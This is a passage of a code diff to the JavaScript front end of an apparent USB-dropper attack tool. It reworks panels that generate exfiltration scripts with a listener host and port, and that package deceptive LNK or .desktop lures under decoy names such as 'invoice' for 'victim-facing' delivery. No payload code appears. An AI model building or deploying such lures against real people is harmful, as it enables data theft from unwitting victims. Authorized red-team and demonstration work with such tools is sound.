+        · LPORT: <span class="snarf-lhost-val">${S.config?.lport || '1337'}</span></div>
     </div>
     ${snarfBuildPreviewBlock()}
+    </div>
+    <div class="snarf-footer">
     <div class="snarf-actions">
-      <button class="snarf-btn primary" onclick="buildSnarfPreview()">⚡ BUILD PREVIEW</button>
+      <button class="snarf-btn primary" onclick="buildSnarfPreview()">⚡ GENERATE</button>
       <button class="snarf-btn" onclick="saveSnarfScript(false)">⬇ SAVE TO PAYLOADS</button>
       <button class="snarf-btn primary" onclick="saveSnarfScript(true)">⬇ SAVE + FLASH</button>
     </div>
-    <div id="snarf-warnings"></div>`;
+    <div id="snarf-warnings"></div>
+    </div>`;
+  wireSnarfFormListeners();
 }
 
 async function buildSnarfPreview() {
@@ -5734,6 +6476,7 @@ async function buildSnarfPreview() {
       return;
     }
     _snarfBuilt = data;
+    captureSnarfFormDraft();
     const script = data.scripts?.[0];
     if (!script) {
       toast('✗ No script generated', 'err');
@@ -5743,7 +6486,10 @@ async function buildSnarfPreview() {
       `${script.filename} · ${script.lang} · ${data.output_mode} · ${data.format}`;
     document.getElementById('snarf-preview-code').textContent = script.content;
     const previewWrap = document.getElementById('snarf-build-preview');
-    if (previewWrap) previewWrap.style.display = '';
+    if (previewWrap) {
+      previewWrap.style.display = '';
+      previewWrap.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+    }
     const warnEl = document.getElementById('snarf-warnings');
     if (warnEl && data.warnings?.length) {
       warnEl.innerHTML = data.warnings.map(w =>
@@ -5757,11 +6503,11 @@ async function buildSnarfPreview() {
 }
 
 async function saveSnarfScript(andFlash) {
-  if (!_snarfBuilt?.scripts?.length) {
-    await buildSnarfPreview();
-    if (!_snarfBuilt?.scripts?.length) return;
-  }
+  captureSnarfFormDraft();
+  await buildSnarfPreview();
+  if (!_snarfBuilt?.scripts?.length) return;
   const savedNames = [];
+  let savedPath = null;
   for (const script of _snarfBuilt.scripts) {
     try {
       const r = await fetch('/api/dropper/snarfsnarf/save', {
@@ -5776,6 +6522,7 @@ async function saveSnarfScript(andFlash) {
       const data = await r.json();
       if (data.ok) {
         savedNames.push(script.filename);
+        if (data.path) savedPath = data.path;
         toast(`✓ Saved ${script.filename}`, 'ok');
       } else toast(`✗ ${data.error}`, 'err');
     } catch (e) {
@@ -5783,27 +6530,42 @@ async function saveSnarfScript(andFlash) {
     }
   }
   if (savedNames.length) {
-    if (S.device === 'usb') await loadDevicePayloads('usb');
+    invalidateLureOptions();
+    if (S.device === 'usb') {
+      queuePayloadSelection(savedPath ? { path: savedPath } : { file: savedNames[0], cat: 'EXFILS' });
+      await loadDevicePayloads('usb');
+    }
     closeSnarf();
   }
   if (andFlash && savedNames.length) {
-    const picked = await selectUsbPayloadByFilename(savedNames[0]);
+    let picked = savedPath ? await selectUsbPayloadByPath(savedPath) : false;
+    if (!picked) picked = await selectUsbPayloadByFilename(savedNames[0]);
     if (picked) await doFlash();
-    else toast('Saved - select payload in BROWSE and flash', 'warn');
+    else toast('Saved - select payload in list and flash', 'warn');
   }
 }
 
 async function selectUsbPayloadByFilename(filename) {
-  const groups = S.payloads.usb || [];
-  for (const g of groups) {
-    for (const p of g.payloads || []) {
-      if (p.file === filename) {
-        selectPayload(p);
-        return true;
-      }
-    }
-  }
-  return false;
+  const base = (filename || '').replace(/\\/g, '/').split('/').pop().toLowerCase();
+  if (!base) return false;
+  const idx = _flatPayloads.findIndex(p => {
+    const f = (p.file || '').toLowerCase();
+    if (f === base) return true;
+    const pathBase = (p.path || '').replace(/\\/g, '/').split('/').pop().toLowerCase();
+    return pathBase === base;
+  });
+  if (idx < 0) return false;
+  await selectPayload(idx);
+  return true;
+}
+
+async function selectUsbPayloadByPath(path) {
+  if (!path) return false;
+  const norm = path.replace(/\\/g, '/');
+  const idx = _flatPayloads.findIndex(p => (p.path || '').replace(/\\/g, '/') === norm);
+  if (idx < 0) return false;
+  await selectPayload(idx);
+  return true;
 }
 
 async function loadLureOptions() {
@@ -5817,12 +6579,45 @@ async function loadLureOptions() {
   return _lureOptions;
 }
 
+function captureLureFormDraft() {
+  if (!document.getElementById('lure-type')) return;
+  _lureFormDraft = lureFormData();
+}
+
+function syncLurePayloadSourceUi() {
+  const src = document.getElementById('lure-payload-src');
+  const wrap = document.getElementById('lure-saved-wrap');
+  const inline = document.getElementById('lure-inline-wrap');
+  if (!src) return;
+  const v = src.value;
+  if (wrap) wrap.style.display = v === 'saved' ? 'block' : 'none';
+  if (inline) inline.style.display = v === 'inline' ? 'block' : 'none';
+}
+
+function onLurePayloadSrcChange() {
+  syncLurePayloadSourceUi();
+  invalidateLureBuild();
+}
+
+function invalidateLureBuild() {
+  _lureBuilt = null;
+  const wrap = document.getElementById('snarf-build-preview');
+  if (wrap) wrap.style.display = 'none';
+  const code = document.getElementById('snarf-preview-code');
+  if (code) code.textContent = '';
+  const meta = document.getElementById('snarf-preview-file');
+  if (meta) meta.textContent = '';
+  const warnEl = document.getElementById('lure-warnings');
+  if (warnEl) warnEl.innerHTML = '';
+}
+
 function lureFormData() {
   const lureType = document.getElementById('lure-type')?.value || 'lnk';
   const preset = document.getElementById('lure-preset')?.value || 'invoice';
   return {
     lure_type: lureType,
     preset,
+    package_name: document.getElementById('lure-package-name')?.value || '',
     custom_name: document.getElementById('lure-custom-name')?.value || '',
     payload_source: document.getElementById('lure-payload-src')?.value || 'stub_windows',
     saved_payload: document.getElementById('lure-saved-payload')?.value || '',
@@ -5847,58 +6642,86 @@ function onLureTypeChange() {
   if (desk) desk.style.display = t === 'desktop' ? 'block' : 'none';
   if (src && t === 'lnk') src.value = src.value === 'stub_linux' ? 'stub_windows' : src.value;
   if (src && t !== 'lnk' && src.value === 'stub_windows') src.value = 'stub_linux';
+  syncLurePayloadSourceUi();
 }
 
 async function renderLurePanel() {
   const panel = document.getElementById('snarf-modal-body');
   const opts = await loadLureOptions();
+  const draft = _lureFormDraft || {};
+  const lureType = draft.lure_type || 'lnk';
+  const defaultSrc = draft.payload_source || (lureType === 'lnk' ? 'stub_windows' : 'stub_linux');
   const typeHtml = (opts.lure_types || []).map(t =>
-    `<option value="${t.id}">${t.label} (${t.platform})</option>`).join('');
+    `<option value="${t.id}" ${lureType === t.id ? 'selected' : ''}>${t.label} (${t.platform})</option>`).join('');
   const presetHtml = (opts.presets || []).map(p =>
-    `<option value="${p.id}">${p.label}</option>`).join('');
+    `<option value="${p.id}" ${(draft.preset || 'invoice') === p.id ? 'selected' : ''}>${p.label}</option>`).join('');
   const srcHtml = (opts.payload_sources || []).map(s =>
-    `<option value="${s.id}">${s.label}</option>`).join('');
+    `<option value="${s.id}" ${defaultSrc === s.id ? 'selected' : ''}>${s.label}</option>`).join('');
   const savedHtml = (opts.saved_scripts || []).map(s =>
-    `<option value="${s.filename}">${s.filename}</option>`).join('');
+    `<option value="${s.filename}" ${draft.saved_payload === s.filename ? 'selected' : ''}>${s.filename}</option>`).join('');
+  const pkgName = (draft.package_name || '').replace(/"/g, '&quot;');
+  const customName = (draft.custom_name || '').replace(/"/g, '&quot;');
+  const inlineCmd = (draft.inline_command || '').replace(/"/g, '&quot;');
+  const deskTitle = (draft.desktop_title || 'Important Documents').replace(/"/g, '&quot;');
 
   panel.innerHTML = `
     <div class="snarf-sub" id="lure-platform-hint">Windows LNK or Linux README/.desktop - pairs with a payload script on the same USB folder.</div>
     ${snarfIntroCards('lure')}
     <div class="snarf-mode-panel">
     <div class="snarf-section">
+      <div class="snarf-label">PACKAGE NAME</div>
+      <input class="snarf-input" id="lure-package-name" type="text" placeholder="e.g. linux_stub_readme_v1" style="width:100%;max-width:520px" value="${pkgName}">
+      <div class="snarf-sub" style="margin:8px 0 0;font-size:12px">Label in the LURES list. Victim-facing filenames are shown as → filename beside each row.</div>
+    </div>
+    <div class="snarf-section">
       <div class="snarf-label">LURE TYPE</div>
-      <div class="snarf-row">
-        <select class="snarf-select" id="lure-type" onchange="onLureTypeChange()">${typeHtml}</select>
-        <select class="snarf-select" id="lure-preset">${presetHtml}</select>
-        <input class="snarf-input" id="lure-custom-name" type="text" placeholder="custom name (if preset = Custom)" style="width:180px">
+      <div class="snarf-row snarf-row--output">
+        <select class="snarf-select snarf-field-grow" id="lure-type" onchange="onLureTypeChange()">${typeHtml}</select>
+        <select class="snarf-select snarf-field-format" id="lure-preset">${presetHtml}</select>
+        <input class="snarf-input snarf-field-name" id="lure-custom-name" type="text" placeholder="custom name (if preset = Custom)" value="${customName}">
       </div>
     </div>
     <div class="snarf-section" id="lure-desktop-wrap" style="display:none">
       <div class="snarf-label">DESKTOP ENTRY TITLE</div>
-      <input class="snarf-input" id="lure-desktop-title" type="text" value="Important Documents" style="width:240px">
+      <input class="snarf-input" id="lure-desktop-title" type="text" value="${deskTitle}" style="width:240px">
     </div>
     <div class="snarf-section">
       <div class="snarf-label">PAYLOAD TO RUN</div>
       <div class="snarf-row">
-        <select class="snarf-select" id="lure-payload-src" onchange="document.getElementById('lure-saved-wrap').style.display=this.value==='saved'?'block':'none'">${srcHtml}</select>
+        <select class="snarf-select" id="lure-payload-src" onchange="onLurePayloadSrcChange()">${srcHtml}</select>
       </div>
       <div id="lure-saved-wrap" style="margin-top:8px;display:none">
         <select class="snarf-select" id="lure-saved-payload">${savedHtml || '<option value="">- save an exfil script first -</option>'}</select>
       </div>
-      <input class="snarf-input" id="lure-inline-cmd" type="text" placeholder="inline command (if custom inline selected)" style="width:100%;margin-top:8px">
+      <div id="lure-inline-wrap" style="margin-top:8px;display:none">
+        <input class="snarf-input" id="lure-inline-cmd" type="text" placeholder="inline command" style="width:100%" value="${inlineCmd}">
+      </div>
     </div>
-    <div class="snarf-sub" style="margin-top:6px;margin-bottom:0">LHOST: <span style="color:var(--red)">${S.config?.lhost || 'not set'}</span>
-      · LPORT: <span style="color:var(--red)">${S.config?.lport || '1337'}</span></div>
-    <div class="snarf-mode-spacer" aria-hidden="true"></div>
-    </div>
+    <div class="snarf-lhost-line">LHOST: <span class="snarf-lhost-val">${S.config?.lhost || 'not set'}</span>
+      · LPORT: <span class="snarf-lhost-val">${S.config?.lport || '1337'}</span></div>
     ${snarfBuildPreviewBlock()}
+    </div>
+    <div class="snarf-footer">
     <div class="snarf-actions">
-      <button class="snarf-btn primary" onclick="buildLurePreview()">⚡ BUILD PREVIEW</button>
+      <button class="snarf-btn primary" onclick="buildLurePreview()">⚡ GENERATE</button>
       <button class="snarf-btn" onclick="saveLurePackage(false)">⬇ SAVE PACKAGE</button>
       <button class="snarf-btn primary" onclick="saveLurePackage(true)">⬇ SAVE + FLASH PACKAGE</button>
     </div>
-    <div id="lure-warnings"></div>`;
+    <div id="lure-warnings"></div>
+    </div>`;
   onLureTypeChange();
+  syncLurePayloadSourceUi();
+  wireLureFormListeners();
+}
+
+function wireLureFormListeners() {
+  ['lure-package-name', 'lure-custom-name', 'lure-preset', 'lure-type', 'lure-saved-payload',
+    'lure-inline-cmd', 'lure-desktop-title'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input', invalidateLureBuild);
+    el.addEventListener('change', invalidateLureBuild);
+  });
 }
 
 async function buildLurePreview() {
@@ -5914,6 +6737,11 @@ async function buildLurePreview() {
       return;
     }
     _lureBuilt = data;
+    captureLureFormDraft();
+    const pkgInput = document.getElementById('lure-package-name');
+    if (pkgInput && !pkgInput.value.trim() && data.suggested_package_name) {
+      pkgInput.value = data.suggested_package_name;
+    }
     const preview = (data.artifacts || []).map(a => {
       if (a.binary) return `# ${a.filename} (binary ${a.lang})\n[${a.filename} - ${a.lang} lure file]`;
       return `# ${a.filename}\n${(a.content || '').slice(0, 4000)}`;
@@ -5922,7 +6750,10 @@ async function buildLurePreview() {
     document.getElementById('snarf-preview-file').textContent =
       `LURE package · ${(data.platform || 'LURE').toUpperCase()} · ${data.artifacts?.length || 0} file(s)`;
     const previewWrap = document.getElementById('snarf-build-preview');
-    if (previewWrap) previewWrap.style.display = '';
+    if (previewWrap) {
+      previewWrap.style.display = '';
+      previewWrap.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+    }
     const warnEl = document.getElementById('lure-warnings');
     if (warnEl && data.warnings?.length) {
       warnEl.innerHTML = data.warnings.map(w => `<div class="snarf-warn">⚠ ${w}</div>`).join('');
@@ -5934,10 +6765,14 @@ async function buildLurePreview() {
 }
 
 async function saveLurePackage(andFlash) {
-  if (!_lureBuilt?.artifacts?.length) {
-    await buildLurePreview();
-    if (!_lureBuilt?.artifacts?.length) return;
+  captureLureFormDraft();
+  const packageName = document.getElementById('lure-package-name')?.value?.trim();
+  if (!packageName) {
+    toast('Enter a package name before save', 'err');
+    return;
   }
+  await buildLurePreview();
+  if (!_lureBuilt?.artifacts?.length) return;
   try {
     const r = await fetch('/api/dropper/lure/save', {
       method: 'POST',
@@ -5945,6 +6780,8 @@ async function saveLurePackage(andFlash) {
       body: JSON.stringify({
         artifacts: _lureBuilt.artifacts,
         package_files: _lureBuilt.package_files || [],
+        package_name: packageName,
+        package_meta: _lureBuilt.package_meta || {},
         username: S.currentUser || '',
       }),
     });
@@ -5953,20 +6790,21 @@ async function saveLurePackage(andFlash) {
       toast(`✗ ${data.error}`, 'err');
       return;
     }
-    toast(`✓ Saved lure package (${data.filenames?.length || 0} files)`, 'ok');
-    _lureOptions = null;
-    if (S.device === 'usb') await loadDevicePayloads('usb');
+    toast(`✓ Saved lure package "${packageName}"`, 'ok');
+    invalidateLureOptions();
+    queuePayloadSelection({ package_id: data.package_id });
+    await loadDevicePayloads('usb');
     closeSnarf();
     if (andFlash) {
-      const toFlash = _lureBuilt?.package_files || data.filenames || [];
-      if (toFlash.length) await flashLurePackage(toFlash);
+      const toFlash = data.package_files || [];
+      await flashLurePackage(toFlash, data.package_id);
     }
   } catch (e) {
     toast(`✗ Save failed: ${e}`, 'err');
   }
 }
 
-async function flashLurePackage(filenames) {
+async function flashLurePackage(filenames, packageId) {
   if (!filenames?.length) return;
   if (S.device !== 'usb') {
     toast('Switch to USB Dropper', 'err');
@@ -5984,6 +6822,7 @@ async function flashLurePackage(filenames) {
     headers: { 'Content-Type': 'application/json', 'X-TSK-User': S.currentUser || '' },
     body: JSON.stringify({
       filenames,
+      package_id: packageId || '',
       username: S.currentUser || '',
       usb_deploy: S.usbDeploy || 'root',
       usb_mount_path: S.usbMountPath || '',
@@ -6263,24 +7102,9 @@ function closeHtpOverlay() {
 function togglePresentationMode(on) {
   S.presentationMode = on !== undefined ? on : !S.presentationMode;
   document.body.classList.toggle('presentation-mode', S.presentationMode);
+  if (S.presentationMode) dismissLhostHint();
   if (typeof window._tskClampPanelWidth === 'function') window._tskClampPanelWidth();
   toast(S.presentationMode ? 'Presentation mode ON' : 'Presentation mode OFF', 'info');
-}
-
-function setDemoMode(on) {
-  const enable = on !== undefined ? on : !S.demoMode;
-  S.demoMode = enable;
-  if (enable) {
-    dismissLhostHint();
-    if (!S.presentationMode) togglePresentationMode(true);
-    applyDefconStyling(true);
-    toast('Demo mode ON - presentation layout + DEF CON styling', 'ok');
-  } else {
-    if (S.presentationMode) togglePresentationMode(false);
-    applyDefconStyling(false);
-    S.demoMode = false;
-    toast('Demo mode OFF', 'info');
-  }
 }
 
 function applyDefconStyling(on) {
@@ -6441,7 +7265,7 @@ function onCmd(e) {
     toast('Close the browser tab to exit TSK web UI', 'info'); return;
   }
   if (raw === 'devices') {
-    fetch('/api/devices').then(r=>r.json()).then(updateDevices);
+    pollAllDevices();
     toast('Device scan complete', 'ok'); return;
   }
   if (raw === 'turtle connect' || raw === 'tc' || raw === 'ssh turtle' || raw === 'turtle ssh') {
@@ -6458,17 +7282,13 @@ function onCmd(e) {
   if (raw === 'hack the planet' || raw === 'htp' || raw === 'hackers') {
     triggerHackThePlanet(); return;
   }
-  if (raw === 'present' || raw === 'presentation mode' || raw === 'presentation') {
+  if (raw === 'present' || raw === 'presentation mode' || raw === 'presentation'
+      || raw === 'demo on' || raw === 'demo') {
     togglePresentationMode(true); return;
   }
-  if (raw === 'present off' || raw === 'presentation off' || raw === 'presentation mode off') {
+  if (raw === 'present off' || raw === 'presentation off' || raw === 'presentation mode off'
+      || raw === 'demo off') {
     togglePresentationMode(false); return;
-  }
-  if (raw === 'demo on' || raw === 'demo') {
-    setDemoMode(true); return;
-  }
-  if (raw === 'demo off') {
-    setDemoMode(false); return;
   }
   if (raw === 'play') { musicPlay(); return; }
   if (raw === 'pause') { musicPause(); return; }
